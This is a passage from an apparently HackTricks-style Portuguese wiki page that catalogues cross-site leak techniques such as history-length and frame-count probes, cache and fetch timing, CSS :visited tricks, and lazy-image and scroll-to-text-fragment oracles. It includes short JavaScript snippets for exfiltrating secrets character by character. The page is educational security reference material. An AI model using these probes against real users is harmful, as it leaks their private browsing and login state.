* **M√©todos de Inclus√£o**: Fetch API, Frames
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Resumo:** Use o limite de redirecionamentos do navegador para verificar a ocorr√™ncia de redirecionamentos de URL.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Se o **n√∫mero m√°ximo** de **redirecionamentos** de um navegador for **20**, um atacante poderia tentar carregar sua p√°gina com **19 redirecionamentos** e finalmente **enviar a v√≠tima** para a p√°gina testada. Se um **erro** for acionado, ent√£o a p√°gina estava tentando **redirecionar a v√≠tima**.

### Comprimento do Hist√≥rico

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Redirecionamentos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Resumo:** O c√≥digo JavaScript manipula o hist√≥rico do navegador e pode ser acessado pela propriedade de comprimento.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

A **API de Hist√≥rico** permite que o c√≥digo JavaScript manipule o hist√≥rico do navegador, que **salva as p√°ginas visitadas por um usu√°rio**. Um atacante pode usar a propriedade de comprimento como um m√©todo de inclus√£o: para detectar navega√ß√£o JavaScript e HTML.\
Verificando `history.length`, fazendo um usu√°rio **navegar** para uma p√°gina, **alter√°-la** de volta para a mesma origem e **verificando** o novo valor de **`history.length`**.

### Comprimento do Hist√≥rico com a mesma URL

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Se a URL √© a mesma que a suposta
* **Resumo:** √â poss√≠vel supor se a localiza√ß√£o de um frame/pop-up est√° em uma URL espec√≠fica abusando do comprimento do hist√≥rico.
* **Exemplo de C√≥digo**: Abaixo

Um atacante poderia usar c√≥digo JavaScript para **manipular a localiza√ß√£o do frame/pop-up para uma suposta** e **imediatamente** **alter√°-la para `about:blank`**. Se o comprimento do hist√≥rico aumentou, significa que a URL estava correta e teve tempo para **aumentar porque a URL n√£o √© recarregada se for a mesma**. Se n√£o aumentou, significa que ele **tentou carregar a URL suposta** mas porque **imediatamente depois** carregamos **`about:blank`**, o **comprimento do hist√≥rico nunca aumentou** ao carregar a URL suposta.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Contagem de Frames

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumo:** Avalie a quantidade de elementos iframe inspecionando a propriedade `window.length`.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar o **n√∫mero de frames em um site** aberto via `iframe` ou `window.open` pode ajudar a identificar o **status do usu√°rio sobre essa p√°gina**.\
Al√©m disso, se a p√°gina sempre tiver o mesmo n√∫mero de frames, verificar **continuamente** o n√∫mero de frames pode ajudar a identificar um **padr√£o** que pode vazar informa√ß√µes.

Um exemplo dessa t√©cnica √© que no Chrome, um **PDF** pode ser **detectado** com a **contagem de frames** porque um `embed` √© usado internamente. Existem [Par√¢metros de URL Abertos](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) que permitem algum controle sobre o conte√∫do, como `zoom`, `view`, `page`, `toolbar`, onde essa t√©cnica poderia ser interessante.

### HTMLElements

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Resumo:** Leia o valor vazado para distinguir entre 2 estados poss√≠veis
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Vazamento de informa√ß√µes atrav√©s de elementos HTML √© uma preocupa√ß√£o na seguran√ßa web, especialmente quando arquivos de m√≠dia din√¢micos s√£o gerados com base em informa√ß√µes do usu√°rio, ou quando marcas d'√°gua s√£o adicionadas, alterando o tamanho da m√≠dia. Isso pode ser explorado por atacantes para diferenciar entre poss√≠veis estados, analisando as informa√ß√µes expostas por certos elementos HTML.

### Informa√ß√µes Expostas por Elementos HTML

* **HTMLMediaElement**: Este elemento revela os tempos de `dura√ß√£o` e `buffered` da m√≠dia, que podem ser acessados atrav√©s de sua API. [Leia mais sobre HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Ele exp√µe `videoHeight` e `videoWidth`. Em alguns navegadores, propriedades adicionais como `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` e `webkitDecodedFrameCount` est√£o dispon√≠veis, oferecendo informa√ß√µes mais detalhadas sobre o conte√∫do da m√≠dia. [Leia mais sobre HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Esta fun√ß√£o fornece detalhes sobre a qualidade da reprodu√ß√£o de v√≠deo, incluindo `totalVideoFrames`, que pode indicar a quantidade de dados de v√≠deo processados. [Leia mais sobre getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Este elemento vaza a `altura` e `largura` de uma imagem. No entanto, se uma imagem for inv√°lida, essas propriedades retornar√£o 0, e a fun√ß√£o `image.decode()` ser√° rejeitada, indicando a falha ao carregar a imagem corretamente. [Leia mais sobre HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### Propriedade CSS

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Resumo:** Identificar varia√ß√µes no estilo do site que se correlacionam com o estado ou status do usu√°rio.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Aplica√ß√µes web podem alterar o **estilo do site dependendo do status do usu√°rio**. Arquivos CSS de origens cruzadas podem ser incorporados na p√°gina do atacante com o **elemento de link HTML**, e as **regras** ser√£o **aplicadas** √† p√°gina do atacante. Se uma p√°gina altera dinamicamente essas regras, um atacante pode **detectar** essas **diferen√ßas** dependendo do estado do usu√°rio.\
Como t√©cnica de vazamento, o atacante pode usar o m√©todo `window.getComputedStyle` para **ler propriedades CSS** de um elemento HTML espec√≠fico. Como resultado, um atacante pode ler propriedades CSS arbitr√°rias se o elemento afetado e o nome da propriedade forem conhecidos.

### Hist√≥rico CSS

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Resumo:** Detectar se o estilo `:visited` √© aplicado a uma URL, indicando que ela j√° foi visitada
* **Exemplo de C√≥digo**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
De acordo com [**este**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), isso n√£o funciona no Chrome headless.
{% endhint %}

O seletor CSS `:visited` √© utilizado para estilizar URLs de forma diferente se elas foram visitadas anteriormente pelo usu√°rio. No passado, o m√©todo `getComputedStyle()` poderia ser utilizado para identificar essas diferen√ßas de estilo. No entanto, os navegadores modernos implementaram medidas de seguran√ßa para evitar que esse m√©todo revele o estado de um link. Essas medidas incluem sempre retornar o estilo computado como se o link fosse visitado e restringir os estilos que podem ser aplicados com o seletor `:visited`.

Apesar dessas restri√ß√µes, √© poss√≠vel discernir o estado visitado de um link indiretamente. Uma t√©cnica envolve enganar o usu√°rio para interagir com uma √°rea afetada pelo CSS, especificamente utilizando a propriedade `mix-blend-mode`. Essa propriedade permite a mistura de elementos com seu plano de fundo, potencialmente revelando o estado visitado com base na intera√ß√£o do usu√°rio.

Al√©m disso, a detec√ß√£o pode ser alcan√ßada sem intera√ß√£o do usu√°rio, explorando os tempos de renderiza√ß√£o de links. Como os navegadores podem renderizar links visitados e n√£o visitados de forma diferente, isso pode introduzir uma diferen√ßa de tempo mensur√°vel na renderiza√ß√£o. Um exemplo de conceito (PoC) foi mencionado em um relat√≥rio de bug do Chromium, demonstrando essa t√©cnica usando v√°rios links para amplificar a diferen√ßa de tempo, tornando assim o estado visitado detect√°vel por meio de an√°lise de tempo.

Para mais detalhes sobre essas propriedades e m√©todos, visite suas p√°ginas de documenta√ß√£o:

* `:visited`: [Documenta√ß√£o MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [Documenta√ß√£o MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [Documenta√ß√£o MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)
### Conte√∫do Documento X-Frame Leak

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Headers
* **Mais informa√ß√µes**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Resumo:** No Google Chrome, uma p√°gina de erro dedicada √© exibida quando uma p√°gina √© bloqueada de ser incorporada em um site de origem cruzada devido a restri√ß√µes de X-Frame-Options.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

No Chrome, se uma p√°gina com o cabe√ßalho `X-Frame-Options` definido como "deny" ou "same-origin" for incorporada como um objeto, uma p√°gina de erro aparece. O Chrome retorna exclusivamente um objeto de documento vazio (em vez de `null`) para a propriedade `contentDocument` desse objeto, ao contr√°rio de iframes ou outros navegadores. Os atacantes poderiam explorar isso detectando o documento vazio, potencialmente revelando informa√ß√µes sobre o estado do usu√°rio, especialmente se os desenvolvedores definirem o cabe√ßalho X-Frame-Options de forma inconsistente, muitas vezes ignorando p√°ginas de erro. A conscientiza√ß√£o e a aplica√ß√£o consistente de cabe√ßalhos de seguran√ßa s√£o cruciais para evitar tais vazamentos.

### Detec√ß√£o de Downloads

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Headers
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Resumo:** Um atacante pode discernir downloads de arquivos aproveitando iframes; a acessibilidade cont√≠nua do iframe implica um download de arquivo bem-sucedido.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

O cabe√ßalho `Content-Disposition`, especificamente `Content-Disposition: attachment`, instrui o navegador a baixar o conte√∫do em vez de exibi-lo inline. Esse comportamento pode ser explorado para detectar se um usu√°rio tem acesso a uma p√°gina que aciona um download de arquivo. Nos navegadores baseados em Chromium, existem algumas t√©cnicas para detectar esse comportamento de download:

1. **Monitoramento da Barra de Download**:
* Quando um arquivo √© baixado nos navegadores baseados em Chromium, uma barra de download aparece na parte inferior da janela do navegador.
* Monitorando as altera√ß√µes na altura da janela, os atacantes podem inferir a apar√™ncia da barra de download, sugerindo que um download foi iniciado.
2. **Navega√ß√£o de Download com Iframes**:
* Quando uma p√°gina aciona um download de arquivo usando o cabe√ßalho `Content-Disposition: attachment`, isso n√£o causa um evento de navega√ß√£o.
* Carregando o conte√∫do em um iframe e monitorando os eventos de navega√ß√£o, √© poss√≠vel verificar se a disposi√ß√£o do conte√∫do causa um download de arquivo (sem navega√ß√£o) ou n√£o.
3. **Navega√ß√£o de Download sem Iframes**:
* Semelhante √† t√©cnica de iframe, esse m√©todo envolve o uso de `window.open` em vez de um iframe.
* Monitorando os eventos de navega√ß√£o na janela rec√©m-aberta, √© poss√≠vel revelar se um download de arquivo foi acionado (sem navega√ß√£o) ou se o conte√∫do √© exibido inline (ocorre navega√ß√£o).

Em cen√°rios em que apenas usu√°rios logados podem acionar esses downloads, essas t√©cnicas podem ser usadas para inferir indiretamente o estado de autentica√ß√£o do usu√°rio com base na resposta do navegador √† solicita√ß√£o de download.

### Bypass de Cache HTTP Particionada <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Resumo:** Um atacante pode discernir downloads de arquivos aproveitando iframes; a acessibilidade cont√≠nua do iframe implica um download de arquivo bem-sucedido.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Por que essa t√©cnica √© interessante: o Chrome agora possui **particionamento de cache**, e a chave de cache da p√°gina rec√©m-aberta √©: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, mas se eu abrir uma p√°gina ngrok e usar fetch nela, a chave de cache ser√°: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, a **chave de cache √© diferente**, ent√£o a cache n√£o pode ser compartilhada. Voc√™ pode encontrar mais detalhes aqui: [Ganho de seguran√ßa e privacidade por meio do particionamento de cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Coment√°rio de [**aqui**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Se um site `exemplo.com` incluir um recurso de `*.exemplo.com/recurso`, ent√£o esse recurso ter√° a **mesma chave de cache** como se o recurso fosse diretamente **solicitado por meio de navega√ß√£o de n√≠vel superior**. Isso ocorre porque a chave de cache √© composta por _eTLD+1_ de n√≠vel superior e _eTLD+1_ do frame.

Como acessar o cache √© mais r√°pido do que carregar um recurso, √© poss√≠vel tentar alterar a localiza√ß√£o de uma p√°gina e cancel√°-la 20ms (por exemplo) depois. Se a origem foi alterada ap√≥s a parada, significa que o recurso estava em cache.\
Ou poderia apenas **enviar algum fetch para a p√°gina potencialmente em cache e medir o tempo que leva**.

### Redirecionamento Manual <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Redirecionamentos
* **Mais informa√ß√µes**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Resumo:** √â poss√≠vel descobrir se uma resposta a uma solicita√ß√£o de busca √© um redirecionamento
* **Exemplo de C√≥digo**:

![](<../.gitbook/assets/image (652).png>)

### Fetch com AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Resumo:** √â poss√≠vel tentar carregar um recurso e interromper o carregamento antes que seja conclu√≠do. Dependendo se um erro √© acionado, o recurso foi ou n√£o foi armazenado em cache.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Use _**fetch**_ e _**setTimeout**_ com um **AbortController** para detectar se o **recurso est√° em cache** e para remover um recurso espec√≠fico do cache do navegador. Al√©m disso, o processo ocorre sem armazenar novo conte√∫do em cache.
### Polui√ß√£o de Script

* **M√©todos de Inclus√£o**: Elementos HTML (script)
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Resumo:** √â poss√≠vel **sobrescrever fun√ß√µes integradas** e ler seus argumentos, mesmo de um **script de origem cruzada** (que n√£o pode ser lido diretamente), o que pode **vazar informa√ß√µes valiosas**.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Workers de Servi√ßo <a href="#service-workers" id="service-workers"></a>

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Resumo:** Medir o tempo de execu√ß√£o de um site usando workers de servi√ßo.
* **Exemplo de C√≥digo**:

No cen√°rio dado, o atacante toma a iniciativa de registrar um **worker de servi√ßo** em um de seus dom√≠nios, especificamente "attacker.com". Em seguida, o atacante abre uma nova janela no site alvo a partir do documento principal e instrui o **worker de servi√ßo** a iniciar um temporizador. Conforme a nova janela come√ßa a carregar, o atacante navega para a refer√™ncia obtida na etapa anterior para uma p√°gina gerenciada pelo **worker de servi√ßo**.

Ao chegar a solicita√ß√£o iniciada na etapa anterior, o **worker de servi√ßo** responde com um c√≥digo de status **204 (Sem Conte√∫do)**, encerrando efetivamente o processo de navega√ß√£o. Neste ponto, o **worker de servi√ßo** captura uma medi√ß√£o do temporizador iniciado anteriormente na segunda etapa. Essa medi√ß√£o √© influenciada pela dura√ß√£o do JavaScript que causa atrasos no processo de navega√ß√£o.

{% hint style="warning" %}
Em um timing de execu√ß√£o, √© poss√≠vel **eliminar** **fatores de rede** para obter **medi√ß√µes mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}

### Timing de Fetch

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Timing (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Resumo:** Use [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) para medir o tempo necess√°rio para realizar uma solicita√ß√£o. Outros rel√≥gios podem ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Timing entre Janelas

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Timing (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Resumo:** Use [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) para medir o tempo necess√°rio para realizar uma solicita√ß√£o usando `window.open`. Outros rel√≥gios podem ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Com HTML ou Reinje√ß√£o

Aqui voc√™ pode encontrar t√©cnicas para extrair informa√ß√µes de um HTML de origem cruzada **injetando conte√∫do HTML**. Essas t√©cnicas s√£o interessantes em casos em que, por qualquer motivo, voc√™ pode **injetar HTML, mas n√£o pode injetar c√≥digo JS**.

### Marca√ß√£o Pendente

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Carregamento Pregui√ßoso de Imagens

Se voc√™ precisa **exfiltrar conte√∫do** e pode **adicionar HTML antes do segredo**, voc√™ deve verificar as **t√©cnicas comuns de marca√ß√£o pendente**.\
No entanto, se por qualquer motivo voc√™ **PRECISAR** fazer isso **caractere por caractere** (talvez a comunica√ß√£o seja via um cache hit), voc√™ pode usar esse truque.

As **imagens** em HTML t√™m um atributo "**loading**" cujo valor pode ser "**lazy**". Nesse caso, a imagem ser√° carregada quando for visualizada e n√£o enquanto a p√°gina estiver carregando:
```html
<img src=/something loading=lazy >
```
Portanto, o que voc√™ pode fazer √© **adicionar muitos caracteres aleat√≥rios** (Por exemplo **milhares de "W"s**) para **preencher a p√°gina da web antes do segredo ou adicionar algo como** `<br><canvas height="1850px"></canvas><br>.`\
Ent√£o, se por exemplo a **inje√ß√£o aparecer antes da flag**, a **imagem** ser√° **carregada**, mas se aparecer **depois** da **flag**, a flag + o lixo ir√£o **impedir que seja carregada** (voc√™ precisar√° ajustar a quantidade de lixo a ser colocada). Isso √© o que aconteceu neste [**writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Outra op√ß√£o seria usar o **scroll-to-text-fragment** se permitido:

#### Scroll-to-text-fragment

No entanto, fa√ßa o **bot acessar a p√°gina** com algo como
```
#:~:text=SECR
```
Ent√£o a p√°gina da web ser√° algo como: **`https://v√≠tima.com/post.html#:~:text=SECR`**

Onde post.html cont√©m os caracteres maliciosos do atacante e a imagem de carregamento lento e ent√£o o segredo do bot √© adicionado.

O que este texto far√° √© fazer o bot acessar qualquer texto na p√°gina que contenha o texto `SECR`. Como esse texto √© o segredo e est√° logo abaixo da imagem, a **imagem s√≥ ser√° carregada se o segredo adivinhado estiver correto**. Assim, voc√™ tem seu or√°culo para **exfiltrar o segredo caractere por caractere**.

Alguns exemplos de c√≥digo para explorar isso: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Tempo de Carregamento Pregui√ßoso de Imagem

Se **n√£o for poss√≠vel carregar uma imagem externa** que poderia indicar ao atacante que a imagem foi carregada, outra op√ß√£o seria tentar **adivinhar o caractere v√°rias vezes e medir isso**. Se a imagem for carregada, todas as solicita√ß√µes levar√£o mais tempo do que se a imagem n√£o for carregada. Isso √© o que foi usado na [**solu√ß√£o deste artigo**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **resumido aqui:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Se `jQuery(location.hash)` √© usado, √© poss√≠vel descobrir via tempo se algum conte√∫do HTML existe, isso ocorre porque se o seletor `main[id='site-main']` n√£o corresponder, n√£o √© necess√°rio verificar o restante dos **seletores**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Inje√ß√£o de CSS

{% content-ref url="xs-search/css-injection/" %}
[inje√ß√£o-de-css](xs-search/css-injection/)
{% endcontent-ref %}

## Defesas

Existem mitiga√ß√µes recomendadas em [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) tamb√©m em cada se√ß√£o do wiki [https://xsleaks.dev/](https://xsleaks.dev/). D√™ uma olhada l√° para obter mais informa√ß√µes sobre como se proteger contra essas t√©cnicas.

## Refer√™ncias

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Tenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
